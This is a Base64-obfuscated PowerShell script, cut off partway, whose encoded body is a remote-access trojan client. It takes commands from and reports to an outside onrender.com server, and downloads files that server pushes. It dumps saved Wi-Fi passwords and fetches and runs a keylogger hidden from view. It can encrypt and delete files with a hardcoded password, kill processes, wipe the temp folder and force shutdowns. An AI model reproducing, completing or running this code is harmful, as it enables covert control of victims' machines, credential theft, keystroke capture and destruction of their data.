$e = [System.Convert]::FromBase64String('JGFwaVVSTCA9ICJodHRwczovL21lLXN6NXkub25yZW5kZXIuY29tL3NlbmQtY29tbWFuZCIKJHJlc3VsdEFQSSA9ICJodHRwczovL21lLXN6NXkub25yZW5kZXIuY29tL3JlY2VpdmUtcmVzdWx0cyIKCkFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLldpbmRvd3MuRm9ybXMKQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uRHJhd2luZwoKJGdsb2JhbDpzZXNzaW9ucyA9IEB7fQokZ2xvYmFsOmN1cnJlbnRTZXNzaW9uID0gJG51bGwKJGdsb2JhbDppZGxlVGltZW91dFNlY29uZHMgPSAxMjAgICMgQWRqdXN0IHRpbWVvdXQgYXMgbmVlZGVkICgyIG1pbnV0ZXMgaW4gdGhpcyBjYXNlKQoKZnVuY3Rpb24gUmVzdGFydC1TeXN0ZW0gewogICAgUmVzdGFydC1Db21wdXRlciAtRm9yY2UKICAgIHJldHVybiAic3VjY2Vzc2Z1bGx5IHJlc3RhcnRlZCBzeXN0ZW0gLiIKfQoKZnVuY3Rpb24gU2h1dGRvd24tU3lzdGVtIHsKICAgIFN0b3AtQ29tcHV0ZXIgLUZvcmNlCiAgICByZXR1cm4gIlN1Y2Nlc3NmdWxseSBzaHV0ZG93biBzeXN0ZW0iCn0KCmZ1bmN0aW9uIERvd25sb2FkLUZpbGVzRnJvbVNlcnZlciB7CiAgICAkc2VydmVyVXJsID0gImh0dHBzOi8vbWUtc3o1eS5vbnJlbmRlci5jb20iCiAgICAkZmlsZXNMaXN0VXJsID0gIiRzZXJ2ZXJVcmwvdXBsb2FkcyIKICAgICR0ZW1wRGlyID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKQogICAgJGRvd25sb2FkZWRGaWxlcyA9IEB7fQoKICAgIFdyaXRlLUhvc3QgIldhdGNoaW5nIGZvciBuZXcgZmlsZXMgZnJvbSAkc2VydmVyVXJsLi4uIgogICAgV3JpdGUtSG9zdCAiU2F2aW5nIGZpbGVzIHRvICR0ZW1wRGlyIgogICAgV3JpdGUtSG9zdCAiUG9sbGluZyBldmVyeSA1IHNlY29uZHMuLi4iCgogICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgIyBHZXQgZmlsZSBsaXN0CiAgICAgICAgICAgICRmaWxlcyA9IEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJGZpbGVzTGlzdFVybCAtTWV0aG9kIEdldAoKICAgICAgICAgICAgZm9yZWFjaCAoJGZpbGUgaW4gJGZpbGVzKSB7CiAgICAgICAgICAgICAgICBpZiAoLW5vdCAkZG93bmxvYWRlZEZpbGVzLkNvbnRhaW5zS2V5KCRmaWxlKSkgewogICAgICAgICAgICAgICAgICAgICRmaWxlVXJsID0gIiRmaWxlc0xpc3RVcmwvJGZpbGUiCiAgICAgICAgICAgICAgICAgICAgJHNhdmVQYXRoID0gSm9pbi1QYXRoICR0ZW1wRGlyICRmaWxlCgogICAgICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgIkRvd25sb2FkaW5nOiAkZmlsZSIKCiAgICAgICAgICAgICAgICAgICAgIyBEb3dubG9hZCBhbmQgc2F2ZSBmaWxlCiAgICAgICAgICAgICAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkZmlsZVVybCAtT3V0RmlsZSAkc2F2ZVBhdGgKICAgICAgICAgICAgICAgICAgICBXcml0ZS1Ib3N0ICJTYXZlZCB0bzogJHNhdmVQYXRoIgoKICAgICAgICAgICAgICAgICAgICAjIE1hcmsgZmlsZSBhcyBkb3dubG9hZGVkCiAgICAgICAgICAgICAgICAgICAgJGRvd25sb2FkZWRGaWxlc1skZmlsZV0gPSAkdHJ1ZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIHdoaWxlIGRvd25sb2FkaW5nOiAkXyIKICAgICAgICB9CgogICAgICAgICMgU2xlZXAgZm9yIHRoZSBzcGVjaWZpZWQgcG9sbGluZyBpbnRlcnZhbCAoNSBzZWNvbmRzKQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKICAgIH0KfQoKCmZ1bmN0aW9uIEtpbGwtQWxsUG93ZXJTaGVsbFByb2Nlc3NlcyB7CiAgICAjIEdldCBhbGwgUG93ZXJTaGVsbCBwcm9jZXNzZXMgKGJvdGggJ3Bvd2Vyc2hlbGwuZXhlJyBhbmQgJ3B3c2guZXhlJykKICAgICRwb3dlcnNoZWxsUHJvY2Vzc2VzID0gR2V0LVByb2Nlc3MgLU5hbWUgInBvd2Vyc2hlbGwiLCAicHdzaCIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKCiAgICAjIElmIHRoZXJlIGFyZSBhbnkgUG93ZXJTaGVsbCBwcm9jZXNzZXMgcnVubmluZwogICAgaWYgKCRwb3dlcnNoZWxsUHJvY2Vzc2VzKSB7CiAgICAgICAgZm9yZWFjaCAoJHByb2Nlc3MgaW4gJHBvd2Vyc2hlbGxQcm9jZXNzZXMpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICMgS2lsbCB0aGUgcHJvY2VzcyBmb3JjZWZ1bGx5CiAgICAgICAgICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRwcm9jZXNzLklkIC1Gb3JjZQogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICMgU2lsZW50bHkgaWdub3JlIGVycm9ycyAoZS5nLiwgYWNjZXNzIGRlbmllZCkKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gQ2xlYXItVGVtcERpciB7CiAgICAjIEdldCB0aGUgcGF0aCB0byB0aGUgdGVtcCBkaXJlY3RvcnkKICAgICR0ZW1wRGlyID0gW1N5c3RlbS5JTy5QYXRoXTo6R2V0VGVtcFBhdGgoKQoKICAgICMgQ2hlY2sgaWYgdGhlIHRlbXAgZGlyZWN0b3J5IGV4aXN0cwogICAgaWYgKFRlc3QtUGF0aCAkdGVtcERpcikgewogICAgICAgICMgRmxhZyB0byB0cmFjayBpZiBhbnkgZmlsZSB3YXMgZGVsZXRlZAogICAgICAgICRkZWxldGVkRmlsZXMgPSAkZmFsc2UKCiAgICAgICAgIyBSZW1vdmUgYWxsIGZpbGVzIGluIHRoZSB0ZW1wIGRpcmVjdG9yeSBzaWxlbnRseQogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJHRlbXBEaXIgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAjIFJlbW92ZSB0aGUgaXRlbSBhbmQgbWFyayBhcyBkZWxldGVkCiAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbSAkXy5GdWxsTmFtZSAtRm9yY2UgLVJlY3Vyc2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgICAgICRkZWxldGVkRmlsZXMgPSAkdHJ1ZQogICAgICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgICAgICMgSWdub3JlIGVycm9ycyBzaWxlbnRseQogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgICAgICAjIFByaW50IHN1Y2Nlc3MgbWVzc2FnZSBpZiBhbnkgZmlsZSB3YXMgZGVsZXRlZAogICAgICAgIGlmICgkZGVsZXRlZEZpbGVzKSB7CiAgICAgICAgICAgIFdyaXRlLUhvc3QgIlN1Y2Nlc3NmdWxseSBkZWxldGVkIGFsbCBmaWxlcyBpbiB0aGUgdGVtcCBkaXJlY3RvcnkuIgogICAgICAgIH0KICAgIH0KfQoKCmZ1bmN0aW9uIEdldC1XaWZpUGFzc3dvcmRzIHsKICAgICMgSW5pdGlhbGl6ZSBhbiBhcnJheSB0byBzdG9yZSB0aGUgcmVzdWx0cwogICAgJHdpZmlEZXRhaWxzID0gQCgpCgogICAgIyBHZXQgYWxsIFdpLUZpIHByb2ZpbGVzIHNhdmVkIG9uIHRoZSBtYWNoaW5lCiAgICAkd2lmaVByb2ZpbGVzID0gbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzCgogICAgIyBMb29wIHRocm91Z2ggZWFjaCBwcm9maWxlCiAgICBmb3JlYWNoICgkcHJvZmlsZSBpbiAkd2lmaVByb2ZpbGVzKSB7CiAgICAgICAgIyBFeHRyYWN0IFdpLUZpIG5hbWUgZnJvbSB0aGUgb3V0cHV0CiAgICAgICAgaWYgKCRwcm9maWxlIC1tYXRjaCAiOlxzKiguKykkIikgewogICAgICAgICAgICAkd2lmaU5hbWUgPSAkbWF0Y2hlc1sxXS5UcmltKCkKCiAgICAgICAgICAgICMgR2V0IGRldGFpbGVkIGluZm9ybWF0aW9uIGFib3V0IHRoZSBXaS1GaSBwcm9maWxlCiAgICAgICAgICAgICRwcm9maWxlRGV0YWlscyA9IG5ldHNoIHdsYW4gc2hvdyBwcm9maWxlIG5hbWU9IiR3aWZpTmFtZSIga2V5PWNsZWFyCgogICAgICAgICAgICAjIEV4dHJhY3QgdGhlIHBhc3N3b3JkLCBpZiBhdmFpbGFibGUKICAgICAgICAgICAgJHdpZmlQYXNzd29yZCA9ICgkcHJvZmlsZURldGFpbHMgfCBTZWxlY3QtU3RyaW5nIC1QYXR0ZXJuICJLZXkgQ29udGVudFxzKjpccyooLispIiB8IEZvckVhY2gtT2JqZWN0IHsgJF8uTWF0Y2hlcy5Hcm91cHNbMV0uVmFsdWUgfSkuVHJpbSgpCgogICAgICAgICAgICAjIEV4dHJhY3QgdGhlIGVuY3J5cHRpb24gdHlwZSAoV1BBMiwgV1BBMywgZXRjLikKICAgICAgICAgICAgJGVuY3J5cHRpb25UeXBlID0gKCRwcm9maWxlRGV0YWlscyB8IFNlbGVjdC1TdHJpbmcgLVBhdHRlcm4gIkVuY3J5cHRpb25ccyo6XHMqKC4rKSIgfCBGb3JFYWNoLU9iamVjdCB7ICRfLk1hdGNoZXMuR3JvdXBzWzFdLlZhbHVlIH0pLlRyaW0oKQoKICAgICAgICAgICAgIyBTdG9yZSB0aGUgV2ktRmkgZGV0YWlscyBpbiBhbiBvYmplY3QKICAgICAgICAgICAgJHdpZmlEZXRhaWwgPSBOZXctT2JqZWN0IFBTT2JqZWN0IC1wcm9wZXJ0eSBAewogICAgICAgICAgICAgICAgV2lGaU5hbWUgICAgICA9ICR3aWZpTmFtZQogICAgICAgICAgICAgICAgRW5jcnlwdGlvbiAgICA9ICRlbmNyeXB0aW9uVHlwZQogICAgICAgICAgICAgICAgUGFzc3dvcmQgICAgICA9IGlmICgkd2lmaVBhc3N3b3JkKSB7ICR3aWZpUGFzc3dvcmQgfSBlbHNlIHsgIihOb3Qgc2V0IG9yIGhpZGRlbikiIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBBZGQgdG8gdGhlIHJlc3VsdHMgYXJyYXkKICAgICAgICAgICAgJHdpZmlEZXRhaWxzICs9ICR3aWZpRGV0YWlsCiAgICAgICAgfQogICAgfQoKICAgICMgUmV0dXJuIHRoZSByZXN1bHRzCiAgICByZXR1cm4gJHdpZmlEZXRhaWxzCn0KCgpmdW5jdGlvbiBTZXQtV2FsbHBhcGVyIHsKICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddJGNoYW5nZQogICAgKQoKICAgIGZ1bmN0aW9uIEludm9rZS1XYWxscGFwZXJDaGFuZ2UgewogICAgICAgIHBhcmFtKFtzdHJpbmddJGltYWdlUGF0aCkKCiAgICAgICAgQWRkLVR5cGUgQCIKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwpwdWJsaWMgY2xhc3MgV2FsbHBhcGVyIHsKICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgU3lzdGVtUGFyYW1ldGVyc0luZm8oaW50IHVBY3Rpb24sIGludCB1UGFyYW0sIHN0cmluZyBscHZQYXJhbSwgaW50IGZ1V2luSW5pKTsKfQoiQAoKICAgICAgICAkU1BJX1NFVERFU0tXQUxMUEFQRVIgPSAweDAwMTQKICAgICAgICAkU1BJRl9VUERBVEVJTklGSUxFID0gMHgwMQogICAgICAgICRTUElGX1NFTkRDSEFOR0UgPSAweDAyCgogICAgICAgIFtXYWxscGFwZXJdOjpTeXN0ZW1QYXJhbWV0ZXJzSW5mbygkU1BJX1NFVERFU0tXQUxMUEFQRVIsIDAsICRpbWFnZVBhdGgsICRTUElGX1VQREFURUlOSUZJTEUgLWJvciAkU1BJRl9TRU5EQ0hBTkdFKQogICAgfQoKICAgIGlmICgkY2hhbmdlIC1tYXRjaCAiXmh0dHBzPzovLyIpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICAkZmlsZU5hbWUgPSBbU3lzdGVtLklPLlBhdGhdOjpHZXRGaWxlTmFtZSgkY2hhbmdlKQogICAgICAgICAgICAkdGVtcFBhdGggPSBKb2luLVBhdGggJGVudjpURU1QICRmaWxlTmFtZQogICAgICAgICAgICBJbnZva2UtV2ViUmVxdWVzdCAtVXJpICRjaGFuZ2UgLU91dEZpbGUgJHRlbXBQYXRoIC1Vc2VCYXNpY1BhcnNpbmcKICAgICAgICAgICAgV3JpdGUtSG9zdCAiSW1hZ2UgZG93bmxvYWRlZCB0byAkdGVtcFBhdGgiCiAgICAgICAgICAgIEludm9rZS1XYWxscGFwZXJDaGFuZ2UgLWltYWdlUGF0aCAkdGVtcFBhdGgKICAgICAgICAgICAgV3JpdGUtSG9zdCAiV2FsbHBhcGVyIGNoYW5nZWQgdG8gZG93bmxvYWRlZCBpbWFnZS4iCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIFdyaXRlLUVycm9yICJGYWlsZWQgdG8gZG93bmxvYWQgb3Igc2V0IHdhbGxwYXBlcjogJF8iCiAgICAgICAgfQogICAgfSBlbHNlaWYgKFRlc3QtUGF0aCAkY2hhbmdlKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgSW52b2tlLVdhbGxwYXBlckNoYW5nZSAtaW1hZ2VQYXRoICRjaGFuZ2UKICAgICAgICAgICAgV3JpdGUtSG9zdCAiV2FsbHBhcGVyIGNoYW5nZWQgdG8gJGNoYW5nZSIKICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgV3JpdGUtRXJyb3IgIkVycm9yIHNldHRpbmcgd2FsbHBhcGVyOiAkXyIKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgICMgVHJ5IGNoZWNraW5nIGluIGN1cnJlbnQgZGlyZWN0b3J5CiAgICAgICAgJGxvY2FsUGF0aCA9IEpvaW4tUGF0aCAoR2V0LUxvY2F0aW9uKSAkY2hhbmdlCiAgICAgICAgaWYgKFRlc3QtUGF0aCAkbG9jYWxQYXRoKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBJbnZva2UtV2FsbHBhcGVyQ2hhbmdlIC1pbWFnZVBhdGggJGxvY2FsUGF0aAogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiV2FsbHBhcGVyIGNoYW5nZWQgdG8gJGxvY2FsUGF0aCIKICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICBXcml0ZS1FcnJvciAiRXJyb3Igc2V0dGluZyB3YWxscGFwZXIgZnJvbSBjdXJyZW50IGRpcmVjdG9yeTogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBXcml0ZS1FcnJvciAiSW52YWxpZCBpbnB1dDogbm90IGEgdmFsaWQgVVJMIG9yIGZpbGUgcGF0aC4iCiAgICAgICAgfQogICAgfQp9CgpmdW5jdGlvbiBTdGFydC1LZXlsb2dnZXIgewogICAgIyBEZWZpbmUgdGhlIFVSTCB3aGVyZSB0aGUga2V5bG9nZ2VyIHNjcmlwdCBpcyBob3N0ZWQKICAgICR1cmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3dhZ25lcjAxMi93YWduZXIvcmVmcy9oZWFkcy9tYWluL2tleS5wczEiCgogICAgIyBEZWZpbmUgdGhlIHBhdGggd2hlcmUgd2Ugd2lsbCBzYXZlIHRoZSBmaWxlCiAgICAkdGVtcFBhdGggPSBbU3lzdGVtLklPLlBhdGhdOjpDb21iaW5lKCRlbnY6VEVNUCwgInRlc3QucHMxIikKCiAgICAjIERvd25sb2FkIHRoZSBmaWxlIHRvIHRoZSB0ZW1wIHBhdGgKICAgIEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJHVybCAtT3V0RmlsZSAkdGVtcFBhdGgKCiAgICAjIFJ1biB0aGUgZG93bmxvYWRlZCBmaWxlIHNpbGVudGx5IChpbiB0aGUgYmFja2dyb3VuZCkKICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGUgLUFyZ3VtZW50TGlzdCAiLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgYCIkdGVtcFBhdGgiYCAtV2luZG93U3R5bGUgSGlkZGVuCn0KCmZ1bmN0aW9uIFN0b3AtS2V5bG9nZ2VyIHsKICAgICMgR2V0IGFsbCBydW5uaW5nIFBvd2VyU2hlbGwgcHJvY2Vzc2VzCiAgICAkcHNQcm9jZXNzZXMgPSBHZXQtUHJvY2VzcyBwb3dlcnNoZWxsIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCgogICAgZm9yZWFjaCAoJHByb2MgaW4gJHBzUHJvY2Vzc2VzKSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgIyBDaGVjayBpZiB0aGUgY29tbWFuZCBsaW5lIGNvbnRhaW5zICJ0ZXN0LnBzMSIKICAgICAgICAgICAgJGNvbW1hbmRMaW5lID0gKEdldC1DaW1JbnN0YW5jZSBXaW4zMl9Qcm9jZXNzIC1GaWx0ZXIgIlByb2Nlc3NJZCA9ICQoJHByb2MuSWQpIikuQ29tbWFuZExpbmUKICAgICAgICAgICAgaWYgKCRjb21tYW5kTGluZSAtbGlrZSAiKnRlc3QucHMxKiIpIHsKICAgICAgICAgICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJHByb2MuSWQgLUZvcmNlCiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIHsKICAgICAgICAgICAgIyBIYW5kbGUgYWNjZXNzIGVycm9ycyBzaWxlbnRseQogICAgICAgIH0KICAgIH0KfQoKZnVuY3Rpb24gRW5jcnlwdC1GaWxlV2l0aFBhc3N3b3JkIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRmaWxlUGF0aAogICAgKQoKICAgICRwYXNzd29yZCA9ICJqYW1hYWwxMjMiCgogICAgIyBHZW5lcmF0ZSBBRVMga2V5IGFuZCBJViBmcm9tIHRoZSBwYXNzd29yZCB1c2luZyBQQktERjIKICAgICRzYWx0ID0gW2J5dGVbXV1AKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoIlNvbWVSYW5kb21TYWx0IikpCiAgICAkaXRlcmF0aW9ucyA9IDEwMDAwCiAgICAka2V5TGVuZ3RoID0gMzIgICMgQUVTLTI1NgogICAgJGl2TGVuZ3RoID0gMTYgICAjIEFFUyBibG9jayBzaXplICgxMjggYml0cykKCiAgICAjIERlcml2aW5nIHRoZSBrZXkgYW5kIElWIGZyb20gdGhlIHBhc3N3b3JkCiAgICAka2V5RGVyaXZhdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SZmMyODk4RGVyaXZlQnl0ZXMoJHBhc3N3b3JkLCAkc2FsdCwgJGl0ZXJhdGlvbnMpCiAgICAkYWVzS2V5ID0gJGtleURlcml2YXRpb24uR2V0Qnl0ZXMoJGtleUxlbmd0aCkKICAgICRhZXNJViA9ICRrZXlEZXJpdmF0aW9uLkdldEJ5dGVzKCRpdkxlbmd0aCkKCiAgICAkZW5jcnlwdGVkRmlsZVBhdGggPSAiJGZpbGVQYXRoLmVuYyIKCiAgICB0cnkgewogICAgICAgICRhZXMgPSBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5BZXNdOjpDcmVhdGUoKQogICAgICAgICRhZXMuS2V5ID0gJGFlc0tleQogICAgICAgICRhZXMuSVYgPSAkYWVzSVYKICAgICAgICAkZW5jcnlwdG9yID0gJGFlcy5DcmVhdGVFbmNyeXB0b3IoJGFlcy5LZXksICRhZXMuSVYpCgogICAgICAgICMgT3BlbiB0aGUgZmlsZSBmb3IgcmVhZGluZyBhbmQgdGhlIGVuY3J5cHRlZCBmaWxlIGZvciB3cml0aW5nCiAgICAgICAgJGZpbGVTdHJlYW0gPSBbU3lzdGVtLklPLkZpbGVdOjpPcGVuUmVhZCgkZmlsZVBhdGgpCiAgICAgICAgJGVuY3J5cHRlZFN0cmVhbSA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5Xcml0ZSgkZW5jcnlwdGVkRmlsZVBhdGgpCiAgICAgICAgJGNyeXB0b1N0cmVhbSA9IE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW0oJGVuY3J5cHRlZFN0cmVhbSwgJGVuY3J5cHRvciwgW1N5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuQ3J5cHRvU3RyZWFtTW9kZV06OldyaXRlKQoKICAgICAgICAjIEJ1ZmZlciBmb3IgcmVhZGluZyBhbmQgd3JpdGluZyBkYXRhCiAgICAgICAgJGJ1ZmZlciA9IE5ldy1PYmplY3QgYnl0ZVtdIDEwMjQKICAgICAgICAkYnl0ZXNSZWFkID0gMAogICAgICAgIHdoaWxlICgoJGJ5dGVzUmVhZCA9ICRmaWxlU3RyZWFtLlJlYWQoJGJ1ZmZlciwgMCwgJGJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgewogICAgICAgICAgICAkY3J5cHRvU3RyZWFtLldyaXRlKCRidWZmZXIsIDAsICRieXRlc1JlYWQpCiAgICAgICAgfQoKICAgICAgICAkY3J5cHRvU3RyZWFtLkNsb3NlKCkKICAgICAgICAkZmlsZVN0cmVhbS5DbG9zZSgpCiAgICAgICAgJGVuY3J5cHRlZFN0cmVhbS5DbG9zZSgpCgogICAgICAgICMgT3B0aW9uYWxseSwgcmVtb3ZlIHRoZSBvcmlnaW5hbCBmaWxlIGFmdGVyIGVuY3J5cHRpb24KICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkZmlsZVBhdGggLUZvcmNlCgogICAgICAgIHJldHVybiAiRmlsZSBlbmNyeXB0ZWQgc3VjY2Vzc2Z1bGx5OiAkZW5jcnlwdGVkRmlsZVBhdGgiCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgcmV0dXJuICJFcnJvciBkdXJpbmcgZW5jcnlwdGlvbjogJF8iCiAgICB9Cn0KCmZ1bmN0aW9uIERlY3J5cHQtRmlsZVdpdGhQYXNzd29yZCB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kZmlsZVBhdGgKICAgICkKCiAgICAkcGFzc3dvcmQgPSAiamFtYWFsMTIzIgoKICAgICMgR2VuZXJhdGUgQUVTIGtleSBhbmQgSVYgZnJvbSB0aGUgcGFzc3dvcmQgdXNpbmcgUEJLREYyCiAgICAkc2FsdCA9IFtieXRlW11dQChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCJTb21lUmFuZG9tU2FsdCIpKQogICAgJGl0ZXJhdGlvbnMgPSAxMDAwMAogICAgJGtleUxlbmd0aCA9IDMyICAjIEFFUy0yNTYKICAgICRpdkxlbmd0aCA9IDE2ICAgIyBBRVMgYmxvY2sgc2l6ZSAoMTI4IGJpdHMpCgogICAgIyBEZXJpdmluZyB0aGUga2V5IGFuZCBJViBmcm9tIHRoZSBwYXNzd29yZAogICAgJGtleURlcml2YXRpb24gPSBOZXctT2JqZWN0IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmZjMjg5OERlcml2ZUJ5dGVzKCRwYXNzd29yZCwgJHNhbHQsICRpdGVyYXRpb25zKQogICAgJGFlc0tleSA9ICRrZXlEZXJpdmF0aW9uLkdldEJ5dGVzKCRrZXlMZW5ndGgpCiAgICAkYWVzSVYgPSAka2V5RGVyaXZhdGlvbi5HZXRCeXRlcygkaXZMZW5ndGgpCgogICAgJGRlY3J5cHRlZEZpbGVQYXRoID0gJGZpbGVQYXRoIC1yZXBsYWNlICdcLmVuYyQnLCAnJwoKICAgIHRyeSB7CiAgICAgICAgJGFlcyA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkFlc106OkNyZWF0ZSgpCiAgICAgICAgJGFlcy5LZXkgPSAkYWVzS2V5CiAgICAgICAgJGFlcy5JViA9ICRhZXNJVgogICAgICAgICRkZWNyeXB0b3IgPSAkYWVzLkNyZWF0ZURlY3J5cHRvcigkYWVzLktleSwgJGFlcy5JVikKCiAgICAgICAgIyBPcGVuIHRoZSBlbmNyeXB0ZWQgZmlsZSBmb3IgcmVhZGluZyBhbmQgY3JlYXRlIGEgbmV3IGZpbGUgZm9yIHdyaXRpbmcgdGhlIGRlY3J5cHRlZCBkYXRhCiAgICAgICAgJGVuY3J5cHRlZFN0cmVhbSA9IFtTeXN0ZW0uSU8uRmlsZV06Ok9wZW5SZWFkKCRmaWxlUGF0aCkKICAgICAgICAkZGVjcnlwdGVkU3RyZWFtID0gW1N5c3RlbS5JTy5GaWxlXTo6T3BlbldyaXRlKCRkZWNyeXB0ZWRGaWxlUGF0aCkKICAgICAgICAkY3J5cHRvU3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkNyeXB0b1N0cmVhbSgkZW5jcnlwdGVkU3RyZWFtLCAkZGVjcnlwdG9yLCBbU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5DcnlwdG9TdHJlYW1Nb2RlXTo6UmVhZCkKCiAgICAgICAgIyBCdWZmZXIgZm9yIHJlYWRpbmcgYW5kIHdyaXRpbmcgZGF0YQogICAgICAgICRidWZmZXIgPSBOZXctT2JqZWN0IGJ5dGVbXSAxMDI0CiAgICAgICAgJGJ5dGVzUmVhZCA9IDAKICAgICAgICB3aGlsZSAoKCRieXRlc1JlYWQgPSAkY3J5cHRvU3RyZWFtLlJlYWQoJGJ1ZmZlciwgMCwgJGJ1ZmZlci5MZW5ndGgpKSAtZ3QgMCkgewogICAgICAgICAgICAkZGVjcnlwdGVkU3RyZWFtLldyaXRlKCRidWZmZXIsIDAsICRieXRlc1JlYWQpCiAgICAgICAgfQoKICAgICAgICAkY3J5cHRvU3RyZWFtLkNsb3NlKCkKICAgICAgICAkZW5jcnlwdGVkU3RyZWFtLkNsb3NlKCkKICAgICAgICAkZGVjcnlwdGVkU3RyZWFtLkNsb3NlKCkKCiAgICAgICAgIyBSZW1vdmUgdGhlIGVuY3J5cHRlZCBmaWxlIGFmdGVyIGRlY3J5cHRpb24KICAgICAgICBSZW1vdmUtSXRlbSAtUGF0aCAkZmlsZVBhdGggLUZvcmNlCgogICAgICAgIHJldHVybiAiRmlsZSBkZWNyeXB0ZWQgc3VjY2Vzc2Z1bGx5OiAkZGVjcnlwdGVkRmlsZVBhdGgiCiAgICB9CiAgICBjYXRjaCB7CiAgICAgICAgcmV0dXJuICJFcnJvciBkdXJpbmcgZGVjcnlwdGlvbjogJF8iCiAgICB9Cn0KCgoKZnVuY3Rpb24gZGV2aWNlcy1mdW5jdGlvbiB7CiAgICAkbW9kZWwgICAgICAgPSAkZW52OkNPTVBVVEVSTkFNRQogICAgCiAgICAjIENoZWNrIGlmIHRoZSB1c2VyIGlzIGFuIGFkbWluaXN0cmF0b3IKICAgICRwcml2aWxlZ2UgICA9IGlmICgoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLkdyb3VwcyAtbWF0Y2ggIlMtMS01LTMyLTU0NCIpIHsgCiAgICAgICAgICAgICAgICAgICAgIkFkbWluaXN0cmF0b3IiIAogICAgICAgICAgICAgICAgfSBlbHNlIHsgCiAgICAgICAgICAgICAgICAgICAgIlN0YW5kYXJkIFVzZXIiIAogICAgICAgICAgICAgICAgfQogICAgCiAgICAkcHJpdmF0ZV9pcCAgPSAoR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IHwgV2hlcmUtT2JqZWN0IHsgJF8uSW50ZXJmYWNlQWxpYXMgLW5vdGxpa2UgIipMb29wYmFjayoiIC1hbmQgJF8uSVBBZGRyZXNzIC1uZSAiMC4wLjAuMCIgfSkuSVBBZGRyZXNzCiAgICBpZiAoLW5vdCAkcHJpdmF0ZV9pcCkgewogICAgICAgICRwcml2YXRlX2lwID0gIlVua25vd24gSVAiCiAgICB9CiAgICAKICAgICMgVGltZXN0YW1wIGluIHVuaXZlcnNhbCB0aW1lCiAgICAkdGltZXN0YW1wICAgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSg